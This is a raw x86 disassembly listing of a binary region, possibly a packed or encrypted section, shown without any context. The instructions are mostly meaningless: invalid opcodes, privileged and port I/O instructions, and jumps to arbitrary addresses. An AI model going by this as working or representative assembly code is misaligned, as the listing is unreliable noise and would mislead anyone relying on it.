  40fa5e:	mov    bh,0xd5
  40fa60:	call   DWORD PTR [edx]
  40fa62:	push   ebx
  40fa63:	lock mov esp,0xf6e5a101
  40fa69:	jnp    0x40fa61
  40fa6b:	test   DWORD PTR [esi],esi
  40fa6d:	adc    esp,esi
  40fa6f:	dec    edx
  40fa70:	lods   al,BYTE PTR ds:[esi]
  40fa71:	or     ch,bh
  40fa73:	mov    DWORD PTR [eax+0x1c623bca],esi
  40fa79:	mov    edi,0x76fbb977
  40fa7e:	lods   eax,DWORD PTR ds:[esi]
  40fa7f:	push   ss
  40fa80:	fwait
  40fa81:	imul   edi,DWORD PTR [ebx],0x5f4dec87
  40fa87:	xor    al,0x23
  40fa89:	(bad)  
  40fa8a:	loope  0x40fac8
  40fa8c:	cmp    ebx,DWORD PTR [ecx+0x3ce316d]
  40fa92:	xlat   BYTE PTR ds:[ebx]
  40fa93:	push   ecx
  40fa94:	mov    ebp,0x79a326d7
  40fa99:	push   es
  40fa9a:	les    esi,FWORD PTR [ebp*2+0x1e541e3]
  40faa1:	jns    0x40fa2d
  40faa3:	stc    
  40faa4:	std    
  40faa5:	es mov esp,0x975b51ab
  40faab:	jae    0x40fae0
  40faad:	fs jge 0x40fae9
  40fab0:	or     BYTE PTR [ecx],bh
  40fab2:	jnp    0x40fae3
  40fab4:	mov    bh,0x8f
  40fab6:	xchg   ebx,eax
  40fab7:	jae    0x40fa44
  40fab9:	xor    eax,0xde06fef1
  40fabe:	fisubr DWORD PTR [ecx-0x16]
  40fac1:	and    BYTE PTR [edx],bl
  40fac3:	retf   0x15fb
  40fac6:	in     eax,dx
  40fac7:	(bad)  
  40fac8:	(bad)  
  40fac9:	js     0x40fa5b
  40facb:	inc    ebp
  40facc:	sbb    edx,DWORD PTR [ebx+0x4d]
  40facf:	jg     0x40fa9a
  40fad1:	mov    BYTE PTR [ecx+edi*8-0x27b56456],ch
  40fad8:	or     al,ch
  40fada:	pop    edx
  40fadb:	cmp    ch,BYTE PTR [ecx]
  40fadd:	dec    ecx
  40fade:	outs   dx,DWORD PTR ds:[esi]
  40fadf:	xlat   BYTE PTR ds:[ebx]
  40fae0:	mov    dl,0x1
  40fae2:	(bad)  
  40fae3:	xchg   DWORD PTR [edi+ebx*2-0x3b],ecx
  40fae7:	mov    ds:0x42101f57,al
  40faec:	into   
  40faed:	pop    ss
  40faee:	aad    0xaf
  40faf0:	outs   dx,BYTE PTR ds:[esi]
  40faf1:	retf   0x993e
  40faf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faf5:	fs jnp 0x40fa9e
  40faf8:	dec    ebx
  40faf9:	ins    BYTE PTR es:[edi],dx
  40fafa:	leave  
  40fafb:	int3   
  40fafc:	mov    cl,0xb6
  40fafe:	clc    
  40faff:	mov    al,BYTE PTR [edx]
  40fb01:	inc    esp
  40fb02:	ja     0x40fb50
  40fb04:	sbb    DWORD PTR ds:[edi+0x273722b1],0x65584e63
  40fb0f:	sub    ah,BYTE PTR [edi+0x2c]
  40fb12:	mov    edi,0xb2aaeb39
  40fb17:	into   
  40fb18:	mov    ds:0xfe07946f,eax
  40fb1d:	or     ebp,ebp
  40fb1f:	mov    al,0x66
  40fb21:	mov    ds:0x7ea7f36,eax
  40fb26:	push   esi
  40fb27:	mov    ch,0xc0
  40fb29:	and    eax,0x42812622
  40fb2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb2f:	in     eax,0x9a
  40fb31:	jp     0x40fb44
  40fb33:	xchg   edi,eax
  40fb34:	(bad)  
  40fb35:	(bad)  
  40fb37:	fdivr  DWORD PTR [ebx]
  40fb39:	out    0x9d,eax
  40fb3b:	jg     0x40fb51
  40fb3d:	cdq    
  40fb3e:	lods   al,BYTE PTR ds:[esi]
  40fb3f:	cs test al,0x90
  40fb42:	cwde   
  40fb43:	lea    esi,[esi+0x67]
  40fb46:	mov    ds:0xe0f6e76b,eax
  40fb4b:	xor    DWORD PTR [edx+eax*2],ebx
  40fb4e:	lea    eax,[ebp-0x52]
  40fb51:	std    
  40fb52:	sub    ebp,ebx
  40fb54:	sbb    eax,ebp
  40fb56:	out    0x67,al
  40fb58:	pusha  
  40fb59:	and    eax,0xbc97f34b
  40fb5e:	xchg   esi,eax
  40fb5f:	add    al,0xdf
  40fb61:	js     0x40fb37
  40fb63:	or     al,0x25
  40fb65:	dec    edi
  40fb66:	push   es
  40fb67:	fwait
  40fb68:	push   ss
  40fb69:	hlt    
  40fb6a:	mov    eax,ds:0x138a086e
  40fb6f:	test   BYTE PTR [esi+esi*4-0x7aa4c603],bh
  40fb76:	push   ss
  40fb77:	pop    eax
  40fb78:	rcl    DWORD PTR [edx],cl
  40fb7a:	nop
  40fb7b:	das    
  40fb7c:	mov    edx,0x2679fda0
  40fb81:	jecxz  0x40fb5e
  40fb83:	mov    DWORD PTR [ecx-0x46ee26e8],eax
  40fb89:	mov    edi,0xf46ea8f5
  40fb8e:	das    
  40fb8f:	lods   al,BYTE PTR ds:[esi]
  40fb90:	pop    edx
  40fb91:	push   es
  40fb92:	leave  
  40fb93:	dec    eax
  40fb94:	mov    bl,0x21
  40fb96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb97:	nop
  40fb98:	mov    ds:0xd154d49e,al
  40fb9d:	sahf   
  40fb9e:	test   eax,0xbdf50a4c
  40fba3:	push   es
  40fba4:	int3   
  40fba5:	into   
  40fba6:	popf   
  40fba7:	xchg   eax,eax
  40fba9:	sahf   
  40fbaa:	arpl   WORD PTR [edi+0x4e],dx
  40fbad:	mov    dl,0x9b
  40fbaf:	xor    DWORD PTR [edx-0x9c39990],esp
  40fbb5:	push   es
  40fbb6:	mov    dl,0x43
  40fbb9:	shl    BYTE PTR [edi+ebp*8],1
  40fbbc:	adc    ecx,0x7727d77e
  40fbc2:	loop   0x40fb8b
  40fbc4:	loop   0x40fc1b
  40fbc6:	ins    BYTE PTR es:[edi],dx
  40fbc7:	dec    edi
  40fbc8:	sbb    DWORD PTR [eax-0x70],ecx
  40fbcb:	sahf   
  40fbcc:	or     BYTE PTR [eax-0x607746e1],0x10
  40fbd3:	cmp    al,0x6f
  40fbd5:	xor    ebp,ebx
  40fbd7:	and    eax,0xc6ee4deb
  40fbdc:	cmp    esi,esp
  40fbde:	and    BYTE PTR [ebp-0x27e70648],bl
  40fbe4:	stc    
  40fbe5:	test   eax,0x9fb8199b
  40fbea:	dec    edx
  40fbeb:	push   ebx
  40fbec:	sbb    al,0x6
  40fbee:	xchg   esp,eax
  40fbef:	jmp    0xa5bb:0x9844c022
  40fbf6:	dec    esi
  40fbf7:	pop    esi
  40fbf8:	jg     0x40fc6a
  40fbfa:	pop    ebx
  40fbfb:	add    esi,DWORD PTR [ecx+0x3f]
  40fbfe:	push   esi
  40fbff:	arpl   WORD PTR [esi+ebp*4-0x1d],bx
  40fc03:	xchg   esi,eax
  40fc04:	cmp    BYTE PTR [ebx+0x3a],ch
  40fc07:	inc    esi
  40fc08:	ds mov ch,0xf9
  40fc0b:	shl    BYTE PTR [edx],1
  40fc0d:	jne    0x40fb95
  40fc0f:	mov    eax,ds:0x360956b0
  40fc14:	pop    ds
  40fc15:	jno    0x40fc4b
  40fc17:	mov    BYTE PTR [edi+0x27868bb4],ch
  40fc1d:	adc    DWORD PTR [edi-0x80],esp
  40fc20:	lds    esi,FWORD PTR [ecx+0xd383ae]
  40fc26:	sub    al,0xf6
  40fc28:	add    bh,BYTE PTR [ebp+0x7d9207c]
  40fc2e:	pop    eax
  40fc2f:	cmp    al,0xe6
  40fc31:	pop    edi
  40fc32:	scas   al,BYTE PTR es:[edi]
  40fc33:	fcomip st,st(0)
  40fc35:	retf   
  40fc36:	sbb    cl,0x3e
  40fc39:	lahf   
  40fc3a:	dec    ecx
  40fc3b:	or     DWORD PTR [eax],esi
  40fc3d:	jle    0x40fbd3
  40fc3f:	sub    al,0x2b
  40fc41:	sbb    BYTE PTR [ebx+0x78],ah
  40fc44:	xchg   esi,eax
  40fc45:	sbb    eax,0xefe15f86
  40fc4a:	dec    ebx
  40fc4b:	mov    ecx,0x7c32bd9a
  40fc50:	push   esi
  40fc51:	ss loop 0x40fbf8
  40fc54:	dec    eax
  40fc55:	in     eax,dx
  40fc56:	push   ebx
  40fc57:	xor    ecx,ecx
  40fc59:	stos   BYTE PTR es:[edi],al
  40fc5a:	xchg   ebp,eax
  40fc5b:	dec    ebp
  40fc5c:	jle    0x787adde7
  40fc62:	(bad)  [ebx+0x31508b16]
  40fc68:	or     BYTE PTR [eax+0x3d],0xf0
  40fc6c:	arpl   WORD PTR [eax-0x5e],si
  40fc6f:	and    al,0xe2
  40fc71:	mov    dl,0x6d
  40fc73:	aam    0xeb
  40fc75:	cld    
  40fc76:	loope  0x40fc78
  40fc78:	int3   
  40fc79:	dec    ecx
  40fc7a:	(bad)  
  40fc7c:	inc    eax
  40fc7d:	bound  esp,QWORD PTR [eax]
  40fc7f:	inc    edx
  40fc80:	je     0x40fc58
  40fc82:	xor    BYTE PTR [eax+0x6c],0xa9
  40fc86:	jmp    0x40fcfb
  40fc88:	and    esp,DWORD PTR [eax+0x4e]
  40fc8b:	icebp  
  40fc8c:	jns    0x40fc87
  40fc8e:	inc    edi
  40fc8f:	loope  0x40fc6b
  40fc91:	xchg   BYTE PTR [eax+0x59],dh
  40fc94:	scas   eax,DWORD PTR es:[edi]
  40fc95:	inc    ecx
  40fc96:	mov    edx,0xc1f7cc74
  40fc9b:	pop    ds
  40fc9c:	hlt    
  40fc9d:	(bad)  [ebx]
  40fc9f:	shl    edx,0xa6
  40fca2:	je     0x40fc46
  40fca4:	sub    eax,DWORD PTR [ecx+0x3c]
  40fca7:	cwde   
  40fca8:	mov    edi,0xeaad9bb6
  40fcad:	stos   DWORD PTR es:[edi],eax
  40fcae:	push   edi
  40fcaf:	imul   ecx,DWORD PTR [esi-0x5e5ece26],0x7a
  40fcb6:	idiv   DWORD PTR [ebp-0x21]
  40fcb9:	mov    ecx,0xf4403842
  40fcbe:	js     0x40fcba
  40fcc0:	mov    eax,ds:0x7e8996f0
  40fcc5:	js     0x40fc66
  40fcc7:	jle    0x40fcf1
  40fcc9:	or     eax,0x812625fb
  40fcce:	or     al,0x77
  40fcd0:	xchg   ebp,eax
  40fcd1:	xor    ch,BYTE PTR [edi+eiz*1]
  40fcd4:	or     BYTE PTR [bp+di+0x72],ah
  40fcd8:	pop    ds
  40fcd9:	sub    al,0x50
  40fcdb:	inc    edx
  40fcdc:	out    dx,al
  40fcdd:	dec    esp
  40fcde:	out    dx,al
  40fcdf:	push   cs
  40fce0:	mov    ebx,0x5a3f3e2e
  40fce5:	ins    DWORD PTR es:[edi],dx
  40fce6:	repnz scas al,BYTE PTR es:[edi]
  40fce8:	push   ebx
  40fce9:	imul   edx,DWORD PTR [edx+0x7de2dafa],0xffffffa3
  40fcf0:	sti    
  40fcf1:	mov    esp,0x5d8308e9
  40fcf6:	mov    BYTE PTR [ecx+0x5fbb6870],al
  40fcfc:	jecxz  0x40fcb8
  40fcfe:	add    ch,dh
  40fd00:	adc    cl,BYTE PTR [edi]
  40fd02:	xor    eax,0xe2c95c43
  40fd07:	iret   
  40fd08:	imul   cx,di,0xa186
  40fd0d:	rol    BYTE PTR [edi-0x81025f9],0x36
  40fd14:	or     edi,DWORD PTR ds:0xe8a40605
  40fd1a:	pop    edi
  40fd1b:	loopne 0x40fcf3
  40fd1d:	mov    al,0x58
  40fd1f:	xchg   esp,eax
  40fd20:	mov    ah,0x93
  40fd22:	push   ebx
  40fd23:	and    eax,0xfb5ce31e
  40fd28:	sub    cl,bl
  40fd2a:	call   0x16834960
  40fd2f:	sub    esi,DWORD PTR [ecx]
  40fd31:	jbe    0x40fcca
  40fd33:	jbe    0x40fdb2
  40fd35:	enter  0xb4cf,0xaf
  40fd39:	push   ebx
  40fd3a:	sahf   
  40fd3b:	dec    esp
  40fd3c:	and    ch,ch
  40fd3e:	dec    eax
  40fd3f:	push   edx
  40fd40:	sub    edx,DWORD PTR ds:0xd6a99056
  40fd46:	enter  0x5930,0xfe
  40fd4a:	push   esp
  40fd4b:	cmp    eax,0x49591d2a
  40fd50:	jbe    0x40fcf3
  40fd52:	ins    BYTE PTR es:[edi],dx
  40fd53:	and    ah,BYTE PTR [ecx-0x52]
  40fd56:	leave  
  40fd57:	jnp    0x40fd1d
  40fd59:	xchg   DWORD PTR [ecx+0x4c],edi
  40fd5c:	add    eax,DWORD PTR [edi-0x5dcb6ed7]
  40fd62:	cdq    
  40fd63:	xchg   edx,eax
  40fd64:	lock (bad) 
  40fd66:	call   0x3a45ee83
  40fd6b:	sub    eax,DWORD PTR ds:0x418cef19
  40fd71:	xor    cl,bh
  40fd73:	jns    0x40fd47
  40fd75:	dec    esp
  40fd76:	mov    WORD PTR [ebx],fs
  40fd78:	xchg   ebp,eax
  40fd79:	mov    eax,ds:0x1e87a45f
  40fd7e:	pop    ds
  40fd7f:	jmp    0xcf1c:0x3cf3e021
  40fd86:	mov    edi,0x208452d1
  40fd8b:	popa   
  40fd8c:	js     0x40fd95
  40fd8e:	jg     0x40fd9f
  40fd90:	pop    ebx
  40fd91:	pop    edi
  40fd92:	nop
  40fd93:	pop    edi
  40fd94:	adc    eax,0xada643e3
  40fd99:	addr16 dec ecx
  40fd9b:	(bad)  
  40fd9d:	ficomp DWORD PTR [edi+eiz*4+0x45a99541]
  40fda4:	hlt    
  40fda5:	lock (bad) 
  40fda7:	sbb    al,0xba
  40fda9:	aad    0xb5
  40fdab:	(bad)  
  40fdac:	in     eax,0xe5
  40fdae:	int3   
  40fdaf:	out    0x9,eax
  40fdb1:	cdq    
  40fdb2:	mov    dh,0x58
  40fdb4:	cs jge 0x40fd82
  40fdb7:	lahf   
  40fdb8:	pop    esp
  40fdb9:	imul   eax,DWORD PTR [edx+ebp*2],0xffffff84
  40fdbd:	xor    edx,0xb1e0c7dd
  40fdc3:	sbb    DWORD PTR [edx+0x4c],ecx
  40fdc6:	mov    ds:0x5eb67fd0,eax
  40fdcb:	xchg   edi,eax
  40fdcc:	jmp    0x788b34fd
  40fdd1:	sub    BYTE PTR [ebx+0x33f454d9],ah
  40fdd7:	sbb    BYTE PTR [ebx],bh
  40fdd9:	or     esp,edx
  40fddb:	jns    0x40fda7
  40fddd:	and    al,0x6c
  40fddf:	mov    al,BYTE PTR [ebx+ebx*8-0x242e8289]
  40fde6:	loope  0x40fddf
  40fde8:	lahf   
  40fde9:	(bad)  
  40fdea:	xchg   ebx,eax
  40fdeb:	cmc    
  40fdec:	pop    edx
  40fded:	pop    edi
  40fdee:	push   DWORD PTR [edx]
  40fdf0:	fcomp  QWORD PTR ds:0x131d7d51
  40fdf6:	mov    bh,0xed
  40fdf8:	cld    
  40fdf9:	mov    dl,0xd3
  40fdfb:	xchg   BYTE PTR [edi-0x3c05a238],bl
  40fe01:	stos   DWORD PTR es:[edi],eax
  40fe02:	aas    
  40fe03:	in     al,0x56
  40fe05:	xor    DWORD PTR [edi-0x72],eax
  40fe08:	cmp    eax,DWORD PTR [bx+di]
  40fe0b:	mov    WORD PTR [ebp-0x1b],?
  40fe0e:	or     ebx,0xffffffb5
  40fe11:	rcr    BYTE PTR [ecx+0x5759feea],cl
  40fe17:	cmp    dl,BYTE PTR [ebp+eax*1+0x1754be15]
  40fe1e:	and    DWORD PTR [ecx+eiz*8],esp
  40fe21:	pextrw ecx,(bad),0xc5
  40fe23:	dec    esi
  40fe24:	jnp    0x40fe8f
  40fe26:	fisub  WORD PTR [esi-0x2f4811e7]
  40fe2c:	cld    
  40fe2d:	bound  esi,QWORD PTR [edi]
  40fe2f:	mov    DWORD PTR [edx+0x21],0xe4e16306
  40fe36:	xchg   ecx,eax
  40fe37:	jmp    0x40fe26
  40fe39:	pop    eax
  40fe3a:	ror    WORD PTR [ecx+0x11],0xc2
  40fe3f:	sub    BYTE PTR [edi+0x733ad180],ah
  40fe45:	jbe    0x40fe4c
  40fe47:	aad    0xfe
  40fe49:	call   0xe77f802c
  40fe4e:	fnstenv [edx-0x17]
  40fe51:	stos   DWORD PTR es:[edi],eax
  40fe52:	xchg   ebp,edi
  40fe54:	inc    edi
  40fe55:	push   ss
  40fe56:	jmp    0x3f0f:0x74dd685e
  40fe5d:	das    
  40fe5e:	test   DWORD PTR [eax-0x7ec38261],ebp
  40fe64:	add    dh,BYTE PTR [ecx-0x59]
  40fe67:	outs   dx,DWORD PTR ds:[esi]
  40fe68:	clc    
  40fe69:	xchg   esp,eax
  40fe6a:	inc    esp
  40fe6b:	dec    eax
  40fe6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe6e:	ss push ebp
  40fe70:	mov    ?,WORD PTR [ecx+0x36]
  40fe73:	into   
  40fe74:	sahf   
  40fe75:	ret    0x310
  40fe78:	loopne 0x40fe22
  40fe7a:	iret   
  40fe7b:	add    dl,BYTE PTR [ebp+0xc]
  40fe7e:	outs   dx,BYTE PTR ds:[esi]
  40fe7f:	aas    
  40fe80:	inc    ecx
  40fe81:	dec    edx
  40fe82:	xchg   esp,eax
  40fe83:	push   esp
  40fe84:	jo     0x40feae
  40fe86:	adc    esi,DWORD PTR [eax+0x28]
  40fe89:	stc    
  40fe8a:	mov    ecx,0x4c77e806
  40fe8f:	data16 scas al,BYTE PTR es:[edi]
  40fe91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe92:	mov    ebp,0x2fa4f01
  40fe97:	xchg   ecx,eax
  40fe98:	jne    0x40fe8d
  40fe9a:	arpl   WORD PTR ds:[ecx+edx*1-0x2c],cx
  40fe9f:	push   esp
  40fea0:	ja     0x40fe34
  40fea2:	pop    ebx
  40fea3:	into   
  40fea4:	std    
  40fea5:	pop    eax
  40fea6:	mov    dl,0x42
  40fea8:	(bad)  
  40fea9:	cld    
  40feaa:	sbb    al,0x34
  40feac:	hlt    
  40fead:	js     0x40ff03
  40feaf:	pusha  
  40feb0:	pop    edx
  40feb1:	ja     0x40fefd
  40feb3:	pop    ds
  40feb4:	stc    
  40feb5:	int3   
  40feb6:	xchg   esi,eax
  40feb7:	out    dx,al
  40feb8:	adc    eax,0x323f03a3
  40febd:	jnp    0x40ff14
  40febf:	push   esp
  40fec0:	push   0xfffffffb
  40fec2:	push   cs
  40fec3:	cli    
  40fec4:	pop    esp
  40fec5:	or     al,0x7b
  40fec7:	inc    ecx
  40fec8:	cdq    
  40fec9:	jae    0x40feb5
  40fecb:	xor    DWORD PTR [edx-0x2a],ecx
  40fece:	je     0x40fe64
  40fed0:	test   bh,bh
  40fed2:	push   es
  40fed3:	ss mov ch,0xd8
  40fed6:	(bad)  
  40fed7:	retf   0xebc4
  40feda:	pop    edx
  40fedb:	fs and al,0x57
  40fede:	dec    DWORD PTR [ebp-0x484d00eb]
  40fee4:	fisttp WORD PTR [esi+0x1e]
  40fee7:	and    al,0x5b
  40fee9:	and    BYTE PTR [edx-0x9],ah
  40feec:	stos   BYTE PTR es:[edi],al
  40feed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40feee:	arpl   WORD PTR [ecx+0x5422c72],bx
  40fef4:	mov    ds:0x2802ceb,eax
  40fef9:	cmp    eax,0x89524026
  40fefe:	sub    eax,0x44b90496
  40ff03:	test   edi,0xf6fd5550
  40ff09:	ss ja  0x40ff3a
  40ff0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff0d:	mov    ebp,DWORD PTR [ebp+esi*2-0x78]
  40ff11:	dec    eax
  40ff12:	sub    eax,0xc0c95d52
  40ff17:	dec    ecx
  40ff18:	sub    eax,0xee0c0c9c
  40ff1d:	and    ebp,DWORD PTR [eax]
  40ff1f:	mov    bh,0xc6
  40ff21:	jp     0x40fed5
  40ff23:	test   DWORD PTR [ecx-0x1f],ebx
  40ff26:	ret    
  40ff27:	jl     0x40ff88
  40ff29:	in     al,0xd1
  40ff2b:	add    al,0x82
  40ff2d:	adc    eax,0x62996b9b
  40ff32:	adc    DWORD PTR [eax-0x6b],ebx
  40ff35:	lock xchg ecx,eax
  40ff37:	fnstenv [esi-0x26]
  40ff3a:	aas    
  40ff3b:	push   es
  40ff3c:	xor    dh,BYTE PTR [edx]
  40ff3e:	retf   
  40ff3f:	in     eax,dx
  40ff40:	push   0x32
  40ff42:	and    ah,ch
  40ff44:	pop    ds
  40ff45:	fisubr DWORD PTR [edi+ecx*1+0x5b7822b7]
  40ff4c:	cmp    BYTE PTR [edx],dl
  40ff4e:	cmc    
  40ff4f:	inc    ebp
  40ff50:	out    dx,al
  40ff51:	jo     0x40fee2
  40ff53:	fxch   st(3)
  40ff55:	mov    bl,0x19
  40ff57:	or     eax,0xdfb768f9
  40ff5c:	div    BYTE PTR [edx+edi*4+0xbacfebd]
  40ff63:	adc    DWORD PTR [edx*2-0x492360ea],0x71
  40ff6b:	popf   
  40ff6c:	mov    ch,bl
  40ff6e:	in     eax,0x2c
  40ff70:	aaa    
  40ff71:	cwde   
  40ff72:	aaa    
  40ff73:	mov    ebx,esp
  40ff75:	inc    edi
  40ff76:	adc    BYTE PTR [edx+edi*8+0x2f7b703],0xf4
  40ff7e:	(bad)
  40ff82:	inc    esp
  40ff83:	inc    esi
  40ff84:	and    BYTE PTR [esi+0x5],0x46
  40ff88:	jae    0x40ffb6
  40ff8a:	or     eax,0x62b23ac
  40ff8f:	loop   0x40ff78
  40ff91:	pop    edi
  40ff92:	pop    esp
  40ff93:	sub    BYTE PTR [edx-0x75],0x83
  40ff97:	call   0x9191:0xe4b2bbcd
  40ff9e:	(bad)  
  40ff9f:	jmp    0x40ffc0
  40ffa1:	les    esp,FWORD PTR [edx+ebx*1]
  40ffa4:	mov    edi,0x77539897
  40ffa9:	xchg   esp,eax
  40ffaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffab:	add    BYTE PTR [eax-0x38],dh
  40ffae:	mov    BYTE PTR [ebp+eax*2-0x1c],al
  40ffb2:	push   eax
  40ffb3:	cmp    DWORD PTR [eax],ebp
  40ffb5:	inc    esp
  40ffb6:	loopne 0x40ffa1
  40ffb8:	dec    eax
  40ffb9:	(bad)  
  40ffba:	retf   0x855d
  40ffbd:	ret    
  40ffbe:	mov    edx,DWORD PTR [esi+ecx*4+0x72]
  40ffc2:	outs   dx,BYTE PTR ds:[esi]
  40ffc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffc4:	sub    BYTE PTR [edx-0x7c],al
  40ffc7:	rcl    DWORD PTR [edx+ebx*4-0x5d1165fe],cl
  40ffce:	push   edx
  40ffcf:	and    DWORD PTR [ebx+0xa],esp
  40ffd2:	push   es
  40ffd3:	cwde   
  40ffd4:	add    al,0x6f
  40ffd6:	cs inc edx
  40ffd8:	aas    
  40ffd9:	les    eax,FWORD PTR [eax+0x4e]
  40ffdc:	and    edi,DWORD PTR [edi-0x28]
  40ffdf:	test   eax,0xb6c059f
  40ffe4:	fwait
  40ffe5:	out    0x1b,al
  40ffe7:	dec    ecx
  40ffe8:	stos   DWORD PTR es:[edi],eax
  40ffe9:	lods   al,BYTE PTR ds:[esi]
  40ffea:	push   0xffffffe0
  40ffec:	add    ecx,DWORD PTR [edi]
  40ffee:	push   cs
  40ffef:	add    ebx,DWORD PTR [ebp-0x40]
  40fff2:	test   eax,0xf94e61d9
  40fff7:	leave  
  40fff8:	adc    dh,cl
  40fffa:	iret   
  40fffb:	xchg   edx,ecx
  40fffd:	popa   
  40fffe:	enter  0x5829,0xe1
  410002:	add    eax,0x2f9bb6e9
  410007:	dec    esp
  410008:	imul   esi,DWORD PTR [esi+0x5a9e961e],0x7404b912
  410012:	shl    BYTE PTR ds:0xebdabea4,cl
  410018:	adc    ah,dl
  41001a:	sahf   
  41001b:	fstp   DWORD PTR [esi]
  41001d:	pop    esp
  41001e:	add    eax,0xe5a85cf
  410023:	jne    0x40ffa9
  410025:	stos   DWORD PTR es:[edi],eax
  410026:	fwait
  410027:	dec    ebx
  410028:	xlat   BYTE PTR ds:[ebx]
  410029:	xchg   esi,eax
  41002a:	data16 jae 0x410019
  41002d:	out    dx,al
  41002e:	(bad)  
  41002f:	call   0x545e925
  410034:	sub    eax,0x57f13ceb
  410039:	inc    esi
  41003a:	mov    ah,0xc4
  41003c:	fld    DWORD PTR [esp+ebp*1-0x3b]
  410040:	aam    0x57
  410042:	aad    0x2d
  410044:	je     0x410043
  410046:	aas    
  410047:	leave  
  410048:	dec    esp
  410049:	gs enter 0xcb3,0xed
  41004e:	pop    es
  41004f:	xchg   ebp,eax
  410050:	scas   al,BYTE PTR es:[edi]
  410051:	in     al,0xa2
  410053:	add    ch,0x73
  410056:	inc    edi
  410057:	add    al,BYTE PTR [ebx]
  410059:	mov    al,0x9f
  41005b:	scas   eax,DWORD PTR es:[edi]
  41005c:	mov    esi,0xdd4882e4
  410061:	(bad)  
  410062:	lea    esp,[edx]
  410064:	sub    BYTE PTR [eax],ch
  410066:	lods   eax,DWORD PTR ds:[esi]
  410067:	or     BYTE PTR ds:0x9bb2cfc7,0xd8
  41006e:	loop   0x4100da
  410070:	or     ebp,ebx
  410072:	xchg   esp,eax
  410073:	mov    dl,0x95
  410075:	push   ebp
  410076:	mov    bh,0x54
  410078:	pop    eax
  410079:	pusha  
  41007a:	mov    al,ds:0x67b5c22f
  41007f:	push   cs
  410080:	pop    ebx
  410081:	add    eax,DWORD PTR [edi+edx*2+0x6c]
  410085:	adc    BYTE PTR [ebp+0x67fb1f95],bl
  41008b:	in     eax,0x69
  41008d:	bound  esp,QWORD PTR [eax*8-0x69af07f8]
  410094:	pop    ds
  410095:	jbe    0x410106
  410097:	cdq    
  410098:	sub    edx,ebp
  41009a:	(bad)  
  41009b:	dec    edx
  41009c:	loopne 0x41011c
  41009e:	mov    ch,0xf4
  4100a0:	test   DWORD PTR [edx-0x9],ecx
  4100a3:	in     eax,dx
  4100a4:	cmc    
  4100a5:	ins    DWORD PTR es:[edi],dx
  4100a6:	push   eax
  4100a7:	or     ebx,edx
  4100a9:	mov    al,ds:0x1169e2c0
  4100ae:	mov    bl,0xce
  4100b0:	popa   
  4100b1:	mov    cl,0x1f
  4100b3:	rcr    DWORD PTR [edi-0x4],0x66
  4100b7:	cs inc eax
  4100b9:	push   ebp
  4100ba:	scas   al,BYTE PTR es:[edi]
  4100bb:	push   ds
  4100bc:	loope  0x410139
  4100be:	(bad)  
  4100bf:	in     eax,dx
  4100c0:	loop   0x4100e9
  4100c2:	xor    esp,esi
  4100c4:	mov    ds:0xe4080f57,eax
  4100c9:	dec    ebp
  4100ca:	into   
  4100cb:	int    0xa7
  4100cd:	mov    ds,ebx
  4100cf:	(bad)  
  4100d0:	mov    ecx,0x835e149b
  4100d5:	sub    al,BYTE PTR [esi]
  4100d7:	xchg   DWORD PTR [edi],esi
  4100d9:	sbb    esi,DWORD PTR [edx]
  4100db:	sub    BYTE PTR [ecx],al
  4100dd:	ins    BYTE PTR es:[edi],dx
  4100de:	ds scas eax,DWORD PTR es:[edi]
  4100e0:	push   0x6ba979e9
  4100e5:	dec    edi
  4100e6:	fstp   DWORD PTR [edi+0x63318154]
  4100ec:	xchg   BYTE PTR [edi+0xab07a72],cl
  4100f2:	inc    ebx
  4100f3:	add    al,0x42
  4100f5:	aam    0xaa
  4100f7:	shr    dh,1
  4100f9:	sbb    edi,DWORD PTR [ebx-0xa687d00]
  4100ff:	add    ebx,DWORD PTR [edi-0x7ddf414c]
  410105:	dec    esp
  410106:	pop    esp
  410107:	outs   dx,BYTE PTR ds:[esi]
  410108:	fsubrp st(1),st
  41010a:	mov    eax,0xce57e6d9
  41010f:	or     ch,BYTE PTR [ebp+0x479aa21a]
  410115:	cdq    
  410116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410117:	cmp    esi,DWORD PTR [edi]
  410119:	mov    bh,0x65
  41011b:	mov    BYTE PTR [ebp+0x48],ah
  41011e:	pop    esp
  41011f:	pop    esp
  410120:	pop    edi
  410121:	mov    ebx,0x73c3bafd
  410126:	fwait
  410127:	nop
  410128:	pop    esp
  410129:	sbb    dl,BYTE PTR [esi+0x4de7042a]
  41012f:	xchg   esi,eax
  410130:	daa    
  410131:	inc    ebx
  410132:	stos   BYTE PTR es:[edi],al
  410133:	jbe    0x41012b
  410135:	lahf   
  410136:	cmp    al,0x33
  410138:	aaa    
  410139:	jl     0x410191
  41013b:	js     0x41013a
  41013d:	mov    edi,0x6c0fe8b5
  410142:	popa   
  410143:	ins    DWORD PTR es:[edi],dx
  410144:	fld    st(6)
  410146:	mov    edi,0x7e5dd6fc
  41014b:	dec    ecx
  41014c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41014e:	out    0x73,al
  410150:	fwait
  410151:	mov    ebx,0xca27b4f5
  410156:	jmp    0x9b3906c8
  41015b:	jae    0x410142
  41015d:	mov    cl,0xa3
  41015f:	or     bl,dl
  410161:	mov    cl,0x7a
  410163:	push   0x6dd2983a
  410168:	loope  0x41013b
  41016a:	adc    eax,0x62ede569
  41016f:	or     dl,BYTE PTR [eax-0x24]
  410172:	sbb    ebp,ebx
  410174:	(bad)  
  410175:	jmp    0x41016d
  410177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410178:	pop    eax
  410179:	cmp    ah,ch
  41017b:	sti    
  41017c:	mov    al,0xd2
  41017e:	arpl   WORD PTR [ebx],bp
  410180:	sbb    DWORD PTR ds:0xcd844f0c,ebx
  410186:	or     BYTE PTR ds:0x5e7f3776,bl
  41018c:	daa    
  41018d:	hlt    
  41018e:	fs dec ebp
  410190:	inc    esp
  410191:	fdivr  st(3),st
  410193:	push   cs
